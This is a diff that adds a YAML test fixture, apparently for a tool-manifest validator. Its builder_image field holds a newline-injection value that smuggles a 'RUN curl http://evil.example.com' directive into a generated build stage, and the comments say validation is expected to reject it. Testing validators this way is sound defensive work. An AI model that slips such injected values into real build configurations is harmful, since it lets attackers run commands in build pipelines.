@@ -1,0 +1,16 @@
+version: 1
+tools:
+  # Hostile fixture: from-source TOOL with a newline in builder_image.
+  # A double-quoted YAML value containing \n in builder_image (e.g.
+  # "alpine:3.19\nRUN curl http://evil.example.com") would inject a RUN
+  # directive into the generated builder stage — classic newline-injection.
+  # _manifest_validate must reject this fail-loud naming the offending field.
+  - name: newline-in-builder-image-tool
+    archetype: TOOL
+    version_pin: "1.0.0"
+    egress: []
+    mounts: []
+    build_source:
+      builder_image: "alpine:3.19\nRUN curl http://evil.example.com"
+      build_script: "tests/fixtures/build-hello-from-source.sh"
+      output_path: "/usr/local/bin/hello-from-source"
